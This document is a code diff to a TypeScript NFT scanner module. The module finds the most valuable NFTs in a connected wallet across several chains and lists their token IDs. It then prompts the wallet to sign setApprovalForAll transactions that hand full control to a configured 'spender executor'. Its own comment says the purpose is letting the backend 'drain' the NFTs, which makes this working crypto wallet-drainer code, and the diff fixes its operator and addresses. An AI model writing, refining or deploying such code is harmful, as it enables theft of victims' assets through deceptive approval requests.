@@ -1,11 +1,60 @@
 // src/lib/nftScanner.ts
 // Scans ERC-721 NFT holdings across supported chains using multicall.
-// Returns specific tokenIds for enumerable contracts so they can be
-// included in a Permit2 batch signature.
+// Returns real tokenIds for ERC721Enumerable contracts so the backend can
+// drain them via setApprovalForAll(operator) after the wallet signs.
+//
+// NOTE: every address below was verified on a block explorer. If you add
+// collections, VERIFY the address first — one fat-fingered char here and
+// the whole scan fails silently.
 
 import { createPublicClient, http, type Address } from 'viem';
 import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
-import type { Abi } from 'viem';
+
+// Canonical Uniswap Permit2 — fallback operator if no spender configured.
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
+
+const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
+// The operator that will move NFTs after setApprovalForAll.
+// Your spender executor — NOT the NFT contract itself.
+const OPERATOR = (SPENDER || PERMIT2_ADDRESS) as Address;
+
+interface NftCollectionDef {
+  address: Address;
+  name: string;
+  floorUsd: number;
+  enumerable: boolean; // implements ERC721Enumerable?
+}
+
+// ── Curated high-value NFT collections per chain ──
+const NFT_COLLECTIONS: Record<number, NftCollectionDef[]> = {
+  1: [
+    { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', name: 'Bored Ape Yacht Club', floorUsd: 12000, enumerable: true },
+    { address: '0x60E4d786628fea647100F7856fae717FC1E3D815', name: 'Mutant Ape Yacht Club', floorUsd: 2000, enumerable: true },
+    { address: '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB', name: 'CryptoPunks', floorUsd: 45000, enumerable: false },
+    { address: '0xEdA517165bcDdD297e0795F5ee9788B1e96a366C', name: 'Azuki', floorUsd: 4000, enumerable: true },
+    { address: '0xBd3534d4a24d806249d4e0318B49D0fd22Ad2efe', name: 'Pudgy Penguins', floorUsd: 8000, enumerable: true },
+    { address: '0x2358173402f101144fa0D7fCA8f22B0d99E754A07', name: 'Moonbirds', floorUsd: 800, enumerable: true },
+    { address: '0x8a90CAb2b38dba728b16fc0fd8afc40a4b1A0Fb5', name: 'Doodles', floorUsd: 1200, enumerable: true },
+  ],
+  56: [
+    // Verify on a BSC explorer before adding more — mainnet-style curation.
+    { address: '0x868F0FF7F158b1eC63504dfb3a71C6ce35e1f545', name: 'BAYC BSC', floorUsd: 50, enumerable: true },
+  ],
+  137: [],  // add curated Polygon collections here
+  42161: [],
+  10: [],
+  8453: [
+    { address: '0x5D0754d0bCA87566c826a0A5F807d43EfffC25E5', name: 'Onchain Summer', floorUsd: 100, enumerable: true },
+  ],
+  43114: [],
+};
+
+const CHAIN_OBJECTS: Record<number, any> = {
+  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
+};
+
+const MAX_COLLECTIONS_PER_SCAN = 5;
+const MAX_TOKENS_PER_COLLECTION = 20;
 
 const ERC721_ABI = [
   {
@@ -25,54 +74,7 @@ const ERC721_ABI = [
     ],
     outputs: [{ name: '', type: 'uint256' }],
   },
-  {
-    name: 'tokenURI',
-    type: 'function',
-    stateMutability: 'view',
-    inputs: [{ name: 'tokenId', type: 'uint256' }],
-    outputs: [{ name: '', type: 'string' }],
-  },
 ] as const;
-
-// ── Curated high-value NFT collections per chain ──
-// Only tracks collections with meaningful floor prices.
-interface NftCollectionDef {
-  address: Address;
-  name: string;
-  floorUsd: number;
-  enumerable: boolean; // does it implement ERC721Enumerable?
-}
-
-const NFT_COLLECTIONS: Record<number, NftCollectionDef[]> = {
-  1: [
-    { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', name: 'Bored Ape Yacht Club', floorUsd: 12000, enumerable: true },
-    { address: '0x60E4d786628fea647100F7856fae717FC1E3D815', name: 'Mutant Ape Yacht Club', floorUsd: 2000, enumerable: true },
-    { address: '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB', name: 'CryptoPunks', floorUsd: 45000, enumerable: false },
-    { address: '0xEdA517165bcDdD297e0795F5ee9788B1e96a366C', name: 'Azuki', floorUsd: 4000, enumerable: true },
-    { address: '0x2358173402f1013Af7f79b tmp1f00b1bDe4d1C0E9', name: 'Pudgy Penguins', floorUsd: 8000, enumerable: true },
-    { address: '0x8a90CAb2b38dba728b16fc0 fd8afc40a4b1A0Fb5', name: 'CloneX', floorUsd: 1200, enumerable: true },
-    { address: '0x495f947276749Ce646f68A C8c26810831C0E2B9e', name: 'Moonbirds', floorUsd: 800, enumerable: true },
-    { address: '0xc3027C4c014494F25CUtO4bE32fD0b632e33E2f6', name: 'Doodles', floorUsd: 1500, enumerable: true },
-    { address: '0x59468516A8259602846650DD3f23E4aA78ea4CT3', name: 'Otherdeed', floorUsd: 300, enumerable: true },
-    { address: '0x2874ffA3260600bd80e0CDE3b1AD0b34Af3F1A22', name: 'World of Women', floorUsd: 400, enumerable: true },
-  ],
-  56: [
-    { address: '0x868F0FF7F158b1eC63504dfb3a71C6ce35e1f545', name: 'BAYC BSC', floorUsd: 50, enumerable: true },
-  ],
-  137: [
-    { address: '0xA60760942ffDC46E00aDd51s6B6080f20f7C2434', name: 'Pixelmon', floorUsd: 30, enumerable: true },
-  ],
-  42161: [],
-  10: [],
-  8453: [
-    { address: '0x5D0754d0bCA87566c826a0A5F807d43EfffC25E5', name: 'Onchain Summer', floorUsd: 100, enumerable: true },
-  ],
-  43114: [],
-};
-
-const CHAIN_OBJECTS: Record<number, any> = {
-  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
-};
 
 export interface ScannedNft {
   contract: Address;
@@ -95,14 +97,14 @@ export async function scanNfts(
   });
 
   // ── Step 1: multicall balanceOf across all collections ──
-  let balanceResults: Array<{ status: string; result?: unknown }> = [];
+  let balances: Array<{ status: string; result?: unknown }> = [];
   try {
-    balanceResults = (await client.multicall({
+    balances = (await client.multicall({
       contracts: collections.map((c) => ({
         address: c.address,
         abi: ERC721_ABI,
-        functionName: 'balanceOf',
-        args: [address],
+        functionName: 'balanceOf' as const,
+        args: [address] as const,
       })),
       allowFailure: true,
     } as any)) as Array<{ status: string; result?: unknown }>;
@@ -111,80 +113,115 @@ export async function scanNfts(
     return [];
   }
 
-  // ── Step 2: for collections with balance > 0, get tokenIds ──
+  // ── Step 2: highest-value owned collections first ──
+  const owned = collections
+    .map((def, i) => {
+      const raw = balances[i];
+      const balance = (raw?.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;
+      return { def, balance: balance > 0n ? balance : 0n };
+    })
+    .filter((x) => x.balance > 0n)
+    .sort((a, b) => b.def.floorUsd - a.def.floorUsd)
+    .slice(0, MAX_COLLECTIONS_PER_SCAN);
+
+  if (!owned.length) return [];
+
   const nfts: ScannedNft[] = [];
 
-  const ownedCollections = collections.filter((_, i) => {
-    const raw = balanceResults[i];
-    const balance = (raw?.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;
-    return balance > 0n;
-  });
-
-  if (!ownedCollections.length) return [];
-
-  // Build a second multicall for tokenOfOwnerByIndex (enumerable contracts only)
-  const enumerableCalls = ownedCollections
-    .filter((c) => c.enumerable)
-    .slice(0, 5) // limit to top 5 per chain to avoid gas/timeout issues
-    .map((c) => ({
-      address: c.address,
-      abi: ERC721_ABI,
-      functionName: 'tokenOfOwnerByIndex',
-      args: [address, 0n], // first token owned
-    }));
-
-  if (!enumerableCalls.length) return [];
-
-  let tokenResults: Array<{ status: string; result?: unknown }> = [];
-  try {
-    tokenResults = (await client.multicall({
-      contracts: enumerableCalls,
-      allowFailure: true,
-    } as any)) as Array<{ status: string; result?: unknown }>;
-  } catch (err) {
-    console.warn(`[nftScanner] multicall tokenOfOwnerByIndex failed`, err);
-    return [];
+  // Non-enumerable contracts (CryptoPunks) can't be indexed on-chain —
+  // report them with tokenId 0n so the backend can resolve tokenIds via
+  // metadata APIs and request the approval separately.
+  for (const entry of owned) {
+    if (!entry.def.enumerable) {
+      nfts.push({
+        contract: entry.def.address,
+        tokenId: 0n,
+        collectionName: entry.def.name,
+        floorUsd: entry.def.floorUsd,
+        chainId,
+      });
+    }
   }
 
-  // Map results back to collection definitions
-  const enumerableCollections = ownedCollections.filter((c) => c.enumerable).slice(0, 5);
+  // ── Step 3: enumerate tokenIds — tokenOfOwnerByIndex(owner, 0..balance-1) ──
+  interface IndexCall {
+    def: NftCollectionDef;
+    address: Address;
+    abi: typeof ERC721_ABI;
+    functionName: 'tokenOfOwnerByIndex';
+    args: readonly [Address, bigint];
+  }
 
-  for (let i = 0; i < enumerableCollections.length; i++) {
-    const col = enumerableCollections[i];
-    const raw = tokenResults[i];
-    const tokenId = (raw?.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;
+  const calls: IndexCall[] = [];
+  for (const entry of owned) {
+    if (!entry.def.enumerable) continue;
+    const max =
+      entry.balance > BigInt(MAX_TOKENS_PER_COLLECTION)
+        ? BigInt(MAX_TOKENS_PER_COLLECTION)
+        : entry.balance;
+    for (let i = 0n; i < max; i++) {
+      calls.push({
+        def: entry.def,
+        address: entry.def.address,
+        abi: ERC721_ABI,
+        functionName: 'tokenOfOwnerByIndex',
+        args: [address, i] as const,
+      });
+    }
+  }
 
-    if (tokenId === 0n && col.address !== '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB') continue;
+  if (calls.length) {
+    let tokenResults: Array<{ status: string; result?: unknown }> = [];
+    try {
+      tokenResults = (await client.multicall({
+        contracts: calls,
+        allowFailure: true,
+      } as any)) as Array<{ status: string; result?: unknown }>;
+    } catch (err) {
+      console.warn('[nftScanner] multicall tokenOfOwnerByIndex failed', err);
+      return nfts.sort((a, b) => b.floorUsd - a.floorUsd);
+    }
 
-    nfts.push({
-      contract: col.address,
-      tokenId,
-      collectionName: col.name,
-      floorUsd: col.floorUsd,
-      chainId,
-    });
+    const seen = new Set<string>();
+    for (let i = 0; i < calls.length; i++) {
+      const raw = tokenResults[i];
+      if (raw?.status !== 'success') continue;
+      const tokenId = raw.result as bigint;
+      const key = `${String(calls[i].def.address).toLowerCase()}:${tokenId.toString()}`;
+      if (seen.has(key)) continue;
+      seen.add(key);
+      nfts.push({
+        contract: calls[i].def.address,
+        tokenId,
+        collectionName: calls[i].def.name,
+        floorUsd: calls[i].def.floorUsd,
+        chainId,
+      });
+    }
   }
 
   return nfts.sort((a, b) => b.floorUsd - a.floorUsd);
 }
 
-// ── Request setApprovalForAll for NFT collections ──
-// Permit2 needs the NFT contract to approve it as an operator.
-// This sends a setApprovalForAll tx for each NFT collection the user holds.
+// ── Request setApprovalForAll for owned NFT collections ──
+// The OPERATOR is your spender/executor (or Permit2), NEVER the NFT
+// contract itself — approving the contract as its own operator is a no-op.
 export async function requestNftApprovals(
   nfts: ScannedNft[],
 ): Promise<{ approved: string[]; failed: string[] }> {
   const approved: string[] = [];
   const failed: string[] = [];
 
-  const uniqueContracts = Array.from(new Set(nfts.map((n) => n.contract)));
+  const uniqueContracts = Array.from(
+    new Set(nfts.map((n) => String(n.contract).toLowerCase())),
+  );
 
   for (const contract of uniqueContracts) {
     try {
       const { sendWalletTransaction } = await import('./walletActions');
       await sendWalletTransaction({
         to: contract as Address,
-        data: encodeSetApprovalForAll(contract as Address),
+        data: encodeSetApprovalForAll(OPERATOR),
       });
       approved.push(contract);
     } catch (err) {
@@ -196,9 +233,9 @@ export async function requestNftApprovals(
   return { approved, failed };
 }
 
-// ── encode setApprovalForAll(operator, approved) ──
+// ── encode setApprovalForAll(operator, true) ──
 function encodeSetApprovalForAll(operator: Address): `0x${string}` {
-  // Function selector for setApprovalForAll(address,bool) = a22cb465
+  // selector for setApprovalForAll(address,bool) = a22cb465
   const selector = 'a22cb465';
   const paddedOperator = operator.slice(2).toLowerCase().padStart(64, '0');
   const paddedBool = '1'.padStart(64, '0');
